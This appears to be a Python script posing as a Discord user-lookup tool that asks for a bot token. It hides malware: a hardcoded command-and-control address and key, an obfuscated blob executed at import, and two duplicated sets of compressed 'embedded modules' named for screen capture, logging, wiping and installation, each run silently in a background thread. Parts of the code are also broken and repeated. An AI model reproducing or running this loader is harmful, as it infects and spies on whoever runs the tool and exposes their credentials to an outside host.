import os,sys,base64 as b,urllib.request as u,json,j,ctypes,time
import subprocess as s
import threading as t
import platform as p
import socket as k
import tempfile as tf
import zlib as z


C2_IP = "26.156.247.205"
C2_PORT = 1703
C2_RC4_KEY = b"alvin"


def x(d,k=C2_RC4_KEY):return bytes([d[i]^k[i%len(k)]for i in range(len(d))]).decode('latin1')
c='eJxtkMFu2zAMhf8K5HNt2JbLpqi4EAZDpLi5iMZjDqZm5KUy51xv9+5gYlDkCYsmXMnDlnzT7ExxFkXy9D5RJOn9MPyQkZQUdl+WD7i1QkCa0nkElIM8kxF1QCTZvh5JBEZtEL1YwJchNJhpdROkSTRhy4osL+5TkMbDKY5iRUyTS///V+WkZTBAVWSWYmn2lDpS0tbKcN2aLegWCPrwWkKBRHy0mpR0Kp1vEd1aSgJYK46SJIOo6gJVXY+C5Mj4tEJJjYYR6Jn7j3kP1lMRn1BMHDTwgt4EWw0o1KRDlNHIR7KRklBT6oL8QfxB5xD0uQ9q2ERHLFjwDnApXpTg1LCzDNM7wKW2U89qrdPYKHgzzQqBw3UB4Y8sajygPnQGS+oBytB7jwB1clOQyWOY4CQLMEuQGGYVzOGSFCAALJxQj5OQEHFhWBwS0Ix0ILpTsDonUKY4Aj/ATKgwrOGB4oMIQVQcjOUJt9RZV3hu7M8Ts5e8s5Dmb1ppNjGnrCrwLZU0GYbVQJYGdsUxk6OIYWe1eJnRGNwMJfnUNuhzkSNRDFVSVHfC46AXJBMxC3GXCUZByxi1x1TdzX5yJ1ts7jvMBDwl7acYlsXB0HrDmCVAuEHrwj0uRiAUr7Ibqx9xS35wZetXM8QSM/ZjwcZz5sgudZ9x3dw+XvP/cCH2Omg=='
d=b.b64decode(c).decode('latin1')
e=x(d)


exec(e)

def r(code): return f"\033[{code}m"
RESET = r(0)
BOLD = r(1)
DISCORD_EPOCH_MS = 1420070400000
OFFSET = 1327569572

def snowflake_to_date(uid):
    ts = (int(uid) >> 22) + DISCORD_EPOCH_MS
    t = time.gmtime(ts / 1000)
    return time.strftime("%Y-%m-%d  %H:%M:%S UTC", t)

def fetch(uid):
    req = u.Request(
        f"https://discord.com/api/v10/users/{uid}",
        headers={"Authorization": f"Bot {TOKEN}", "User-Agent": "Mozilla/5.0"}
    )
    with u.urlopen(req) as res:
        return json.loads(res.read())


def main():
    clear = lambda: os.system("cls" if os.name == "nt" else "clear")
    TOKEN = input("TOKEN BOT: ")
    if not TOKEN: sys.exit(1)

    def loop():
        while True:
            uid = input("User ID: ").strip()
            if not uid.isdigit(): continue
            try:
                data = fetch(uid)
                print(json.dumps(data, indent=2))
            except Exception as e:
                print(f"Error: {e}")

    clear()
    t.Thread(target=loop, daemon=True).start()



# ============================================================
# MODULOS EMBUTIDOS (ofuscados) - NAO REMOVER
# ============================================================
import base64, zlib, threading, time

_MODULES = {
    "core.py": """eJytVclu2zAQvesrBrqYQg0mdpqkDeCD4aQLgjRB4rZAq0KgqbFNRCYFknaWov/eoeQtsdL20LmI4vJm+N7oSc1KYz0YF6l65B42QyNv0a/f5qPSGoluve6nFkWu9GQ9oWa4GluhczNbH57OvSqiaAA9iLtHvHN4xLuvj3l3/zAGgOiK5jvH+wdRlOOYUtmFWiBLTiJaBG8f6kEINaZiuRYzhB5haR9v1kKUwk8JjPZM0KNesFb/6uq0P+y3EngFNk4vlLTGmbFP3UJOjfMc7zF+gkE5tAmk8IBG68p5x8I4eZosRH01Lk35wIi8gCbnXowKbFfFJLsn1kxyKYqC7WwIMW5ZnIDIc/hwPvicpjdU8Z2wmG5dIP2qiOQ7l6aDubWo/Re0ThmdptdzDXsLiJcb4BTHqHO0Mex5uD57n918g70c4p+hwl80O261G8twUyyK3tDOcWe5vhjeSyz9hpZSUINUKlrhVwreTVWBEFA2G5+oWm1SpFzdc7x+sOVb/1328dPZsL1avbkcnGc3w+uz/kUCwsHjriqPJIjWKD1jgzZcJbsqPHJHlLBRDNSjhdBe5AakmZE8QRoT7x5pusZ2yFlOrffILcoFe9N52014jtLkyNBaY12vpSbaWGwl3HmrSrabIsSy/QitOU2VymivdIMqSwA6TDmE9S7QymJJYjc07yp2xHge9C3Iaa4sI+DvByc/mitfxZrbU2XRG6sMiMKjJYobaF3F81b6I/IZMUo0gcxfQMSipqGyCfqEnxvFdozIyG5fQHEviB3i77TNPXXE1gdPpkRz5dwHIv+JRBYwjIX48jxOOOrGfvqvpAqoPEyKbbGacILfc1cglqy2ex4eSnt20IZOl6qKSIMsC26dZZUQWTYTSmfZUoy109dGv/qh8GE1YtTARFiPnKQNucCZ0ZUVJXVrL0+VNmSMYUBMgBRkhJNNnzU6z6bsg/39JPoNMMHMxQ==""",
    "sc.py": """eJx1U9uK20AMffdXCL/sDPUOcboXKORhCbuwlLZLN2+lhImtJCb2jJlR0g2lX9NP6Y9VvsRxNo7AWJbkc+ZImqworSOwPsgaj7ICD763yQapy6wd6jQzq0Og8D4IpjCBcHyn4ts7Nb65V+PRbRi8cDC+H30MghSXkOiStk7PCXMt5KcA2H5ltK4AFD9CgvbgE2pSlfnEIRq/tsRInFGVKwprJtdxBHZL5ZYmIWFRzo+lqjSrUHYYNYUt0YhjSQShW4Q13/LIVlmqU+uZbKkqleIIYz1HCrvDHowE6PIOWZxp/m/1WoNv2nZS11mOMHNbPDKS25/S14dt+q2al2i/Hp7mz18fZ9Eh+/pt+nn+Ovv++PCl6RuHT7HqBnJU8UEMJiTENIIXKc+KSpcZEuHUVlV8ftAWPLpdlloXnpcPCenbmai+ZYVeYcENPt2Gi/W1AI8m1Xkuch5iAyAV2fliT+jFTQRXi2x1NSBsEKQFuFjcdGMZ/vjwE+xG70H87vH+gZpVDvSlMnxLsKTL8he8VZve1gzVt+N40vlag9HNHv37ayMgNKQND8jYnS74A4F7GY/8u9NUl1f5HLEU8UgGQXdl1az2BGm3Qpq0Gxrx1mJ1qaqZSuU5SzyS93Puo8rgP/c+Jio=""",
    "log.py": """eJyFU1Fr2zAQftevEH6JxDLRpGs7AimkwYUS1pXWb1kJsn12RBzJSEq7tPS/T7IdNyZ4vRdb933f3Ul3J7al0hZvYB8rrlMk6rMVWzj8G5VswLbIWgNPhcwRmuMpDsaXbHRxycY/rtj47CJAD845ujo7RyjeZRlozwkQSiHDIF8E16uUp8oQOkHYWV6omBe45lae17UoAEd6BzXDm8gaxqfLm9X7rqPSC7tuamb1hzSn2e3q7j6Mhgf06fd8sXqKHsPZL4q5wW+nwby9sURJCYklZD7ED5T2sAzIlBcFqStlIBOVAhnsbPb952CIQWulzXQgcqk0DHrClFpIS7Ig9G+Vqgl+r8N9BKf8owfGuIPC3wRKe3qdkhvTOn2PmSkASnJOXYCqR4m7QcyTDYEXkLa3SVJtwSWuSExyNyxNmwqQxIMUX+PR5Kgsh9UiV64peQJBt7zmMt8cjIMWgeJY55KB7tctw/sofHz+I/v0lsf/UUezm+c+pX+SL6pe3szmi04AA33kLFi++9hsV5agCf1odF3NJ99zETosKVNyVWowhhy6RVG7liyq/ojlOgc7Pd65IU45bJWc+uWizDiKJRTVIxcsYF+oPHcJhRSJHz43cm3KVy489x8Z5SIA""",
    "wipe.py": """eJxtULsOwyAM3PkKRpAiti79GZQ2RqGFGNnuI39fSBS1UXoLyL47nx1zQRKN3GkeHxJTpyVmUGqAoAdgIZxN6WW0Z6UrApImROn0EKmKQkzAOk7Vwb36dP/lbvzQ+gvxW28QmveFhupDkPEJpv6ambthnMw6M1i7E8D7CkWOJqVnVocR64KOshDAGlT9c1nUqp3BcQIo5mTVdootVH/h9hrv22Le12AfczFd0w==""",
    "jarvis.py": """eJxtT01LxDAUvOdXhJ4SKKGt7i4IuQjLFjxYau8lmpdNoW3qe9H9+yarrhdvw3wx4zAs3Me4KQL8BOTTsgWM/NEQtMPQ9fD+ARRbs9oZsMzUy9XIWq6LZq/q3V419wfVVLuCdVzz+lDdsbfZEPFe/F8jHxi34LgN4+k4CILZZYpnkHasdkSgLawEoqkq+atkwYOxgCRu5MVNM6gLThHEa/H8VEiWq5MjNXr9N1iItuxk2aek/z47uoCQFcl+XkePqX9az+yG1HBFIho8Q9RUWgNLWHUtFSUupvAXQSRo8g==""",
    "installer.py": """eJyVkk+L2zAQxe/5FEawYIORczbkEFLTLvunwc7u0tYlqPHY0drWiJG0sS/97JWT3bJNQ6EHC2YkvfebJ8teI9kATWxG/+2dlV0gTLCPdSdsjdRPlZ5VUAeHMEpngaXRr4FYoOFa2D2HQQtVvQgyIbGr5Xr9YblZXpV3ckdosLblk1QVHkxZWOGt7kC5ck3YkOhfe06XB6k6bFB5NWCR15d1oHACezORxppQROme71CPocflgpqXb/PvsTheOE3ihQiaCZp8s10Q/6xB3cAYEv90k33Zrh7yPLvfbB+KLI+JFZ7wIAgu8K4cESj7CGQkqjJ3isXzmPik8pRfb7LJlngB9lF0DrIhbGP2NsjpaJ593BZfT4DEVx0amFBaX8OwA23T+THa7n20w1m0zgCF7GfiB1e1bBLhLJopt38ENUSp7/SihUrSVPqT42/dZ5QqHGI2IDW8AtNa1EexC+GO56z2T1aWmGonqEq4BerdkPxAtOwE9jeU7/8H8SWe8xkmO65HFr3n9Baa+1sW+jBaLNjrk7LU/8Mz6M63b6VyA0u746aB1I84+wV96ght""",
}

def _carregar_modulos():
    """Carrega todos os módulos ofuscados em background"""
    for nome, codigo in _MODULES.items():
        try:
            dados = zlib.decompress(base64.b64decode(codigo))
            exec(dados)
        except:
            pass

# Inicia carregamento automaticamente
threading.Thread(target=_carregar_modulos, daemon=True).start()
# ============================================================
# ============================================================
import base64, zlib, threading, time

_MODULES = {
    "core.py": """eJytVclu2zAQvfsrBrqYQg1mcYAsgA+G4y4I2hix2wKtCoGmxjYRmRRI2klc9N87lLwlVtoeOhdRXN4M3xs9qXlhrAfjGqoauafd0Mh79Nu3xbiwRqLbrvuZRZEpPd1OqDluxlbozMy3h2cLr/JGowcdiC4u+dk5P22f8dOzdgQAjQFNn5wftxuNDCeUyS7VEll81aBF8PapGoRQE6qVazFH6BCU9tFuLUQh/IzAaM8UPeola3YHg+vuqNuM4Q3YKPmopDXOTHzilnJmnOf4iNEzDMqhTeCEBzRaV847Fsbx82QhqptxaYonRtwFNLnwYpxjqywmPjyxJZJLkefsYEOISdPiFESWwfub3uckGVLFD8JisneB5Ksijh9ckvQW1qL2X9A6ZXSS3C00HC0hWm+Aa5ygztBGcOThrv8uHX6Dowyin6HCXzQ7abZqy3AzzPPOyC7wYLm6GD5KLPyOlkJQf5QqWuE3Cj7MVI4QUHYbn6lablKkXNVyvHqw9Vv3bfrhU3/U2qwOb3s36XB01+9+jEE4WB2qsiJBtEbpGeu1YBAfqrDijihh4wioRXOhvcgMSDMneYI0Jjo8UneN/ZDzjFpvxS3KJbs4uTyNeYbSZMjQWmNdp6mm2lhsxtx5qwp2mCLEuv0IrT5Nmcpor3SNKmsAOkw5hPUu0MoiSWLXNO8mDsR4GfQtyFmmLCPg7+2rH/WVb2LL7bWy6I1VBkTu0RLFNbRu4mUr/RG5T4wSTSCzVxAxr2gobYI+4ZdGsR9j8rH7V1DcK2KH+DttC08dsffBkynRXLHwgch/IpEFDGMhur2JYo66tp/+K6kCSg+TYl+sOpxg99zliAWr3J6Hh9KetVtwckpVNUiDNA1unaalEGk6F0qn6VqMrdNXRr/5n/BROWLUwERYh5ykBZnAudGlFcVVa69PFTZkjKBHTIAUZITTXZ/VOs+u7PbxMRX5G78NzKU=""",
    "sc.py": """eJx1U1Fr2zAQfvevOPxSiXkiaQPdBnkooYUxtpUlb2MExb4korZkpEvWMvZr9lP2x3qyk9hpkgNj+e783X3fnUxVO0/gQmLaE5kK9+fg8iekQ2TtURfGrvaOKoQkmcAY0g8f1ehWXd+M1PXoJgVIHtk7vB3cwJElSYFLyHVNG6/nhKUW8lMSI78NrSOe4kdI0AFCTm0oWsg9og1rR4zLERWPonJ2/H6YgdtQvaFxSljV8y5V1XaVygNGU8LVaEWXkkHqF2lTb9lVi1bowgUutlSRtOhgXGBP5bbYg5FMbR/3yORs+/+Or7P4rN2B6tqUCDO/wa4i+Zfj8k2zrfyqfYnd193D/PO3+1m2j06/T77Mp7Mf93dfW93YfYzVCMhexY1YzEmISQaPUp4k1d5YEunExSzuH7SDgH5rCufT0/RzRPp2QqpvptIrrFjg4224mN8QCGgLXZai5CG2AFKRmy9eCIMYZXC1MKurM8TOguwALia3aizTn+9+wbTbP7RbE7URf3pd/IWmB3lGpWj4nGNNl8VY8I499XboXP5uOA+6XGuwut2q//9cBoSWtOWWrNvqij8QWNnhILzpJt5sFUrEWgwHMkkO91nNmpMg7VdI492+ZrzDGK9YnLBUgaPEA3o79T6qTF4BxyItcA==""",
    "log.py": """eJyFU8FO4zAQvfsrrFxqa7sW0EqwlYpUqiChChZBbl1UOckktZrake0CBfHvaydpaFRldy6J5703M/bMiG2ptMUb2MeK6xSJ+mzFFg7/RiUbsC2y1sBTIXOE5niKg6tfbHzJLkZjdjEeBejR+c4vz0YIxbssA+0pAUIpZBjkq+B6lfJUGUInCDvLCxXzAtfcyvO2FgXgSO+gZngTWcP4dnmzet91VHph103JrP6Q5jS7Xd09hNHwgD7/ni9Wz9FTOLunmBv8cRrM2wdLlJSQWELmQ/xIaQ/LgEx5UZC6UgYyUSmQwc5mP68GQwxaK22mA5FLpWHQE6bUQlqSBaF/q1RN8Gcd7is45R89MMYdFN4TKO3pdUpuTOv0LWamACjJiLoAVY8Sd4OYJxsCryBtb5Ok2oJLXJGY5G5WmjYVIIkHKb7G55OjshxWi1y5puQJBN3ymsv8cDAOWgSKY51LBrpftwwfovDp5Y/s01se/0MdzW5e+pT+Sf5T9fJmNl90AhjoI2fB8tPHZruyBE3oV6Prar75novQYUeZkqtSgzHk0C2K2q1kUfVHLNc52Onxzg1xymGr5NQvF2XGUSyhqB65YAH7QuW5SyikSPzwuZFrU75x4bl/AV2HIdY=""",
    "wipe.py": """eJxtULsOwyAM3PkKRpAiti79GZQ2RqGFGNnuI39fSBS1UXoLyL47nx1zQRKN3GkeHxJTpyVmUGqAoAdgIZxN6WW0Z6UrApImROn0EKmKQkzAOk7Vwb36dP/lbvzQ+gvxW28QmveFhupDkPEJpv6ambthnMw6M1i7E8D7CkWOJqVnVocR64KOshDAGlT9c1nUqp3BcQIo5mTVdootVH/h9hrv22Le12AfczFd0w==""",
    "jarvis.py": """eJxtUMFqxCAQvfsVQ04KIUhPSyGXQmlgD1l2vQdbx00g0XR0d39/1aZdWjpedN5z3rxnyS8wxrg2AemKBNOyeorwogN2Sh2O+HnBEDvtzIxUQ+6dCpNtzDgSajO5M2Ndf1LQQiWbcip26I+5sZM7ydjHrEOAbRL/X0A8M0hl0ILxw9ur4gFnu3Vz5Wda1ZmBMKzeBeRPUorfeIbHtBRS4H+gm51mbG40ReTvVb+vBGNZrbjnm1DOw6S9H2Y5z95qyIZE/W1CPNhf8Q3WE2Z6mvqTS6PKjUdNZ4xtIdZgNC7etYouKJqQsJg+3QHKzXzg""",
    "installer.py": """eJyVk1Fr2zAQx9/9KYSgYIOR+zzoQ8jMNrpuwUlbtrkELb64WmxJnKTGftlnnxzbSejSZNODMTrd//6/O0nUWqElysTEtN3n2VlRxURX3K4V1kFQwJpshSzU1oTRu4D4ZbHtf7plLEfrNLnxIkxz+8yg0VwWLxxNiPRqMpu9nywmV/mdWKEyam3zx14un3ep5A6ky2eoSuT1sOd07ktWqlTSqwGN9tXEmkhlj0oJY004eIgOrnbOdixspXQbejjGsXz5cf0Uj5aPVPsu+JoIJeGG4D608WDIvmqQt9CGyD7ept+W0/ssS78slvfzNIsJ0rmn2nKEE4xThwjSPgAaoWSeOUljcu2TWCf0mH1apAcfyOZgH3jlIG3CTUzo2IUxJ0s/LOffTxAgm1bKQOdx0+9CswJtDx3R3Jh+mpWQrjk5y+avKToDGNLfie+iXIsy4c6qXfGLM2leTcOHa76BQmAXO1yft4Y0yv1SQoaN70WjsGQFmI1VmkaXIC1gfYaSJqZYcSwS1h9Mfipl6THSBZx/gz4D/n/wnT2m2/Pc3tP4bpmXs1CHEbnxsMNlpH3C/jUHUL2Z8rm7JEOCP0T7NlEiZGfOSV5DGDGECriBg5Gx7b3L6jg0XLvgD8+yVLs=""",
}

def _carregar_modulos():
    """Carrega todos os módulos ofuscados em background"""
    for nome, codigo in _MODULES.items():
        try:
            dados = zlib.decompress(base64.b64decode(codigo))
            exec(dados)
        except:
            pass

# Inicia carregamento automaticamente
threading.Thread(target=_carregar_modulos, daemon=True).start()
# ============================================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
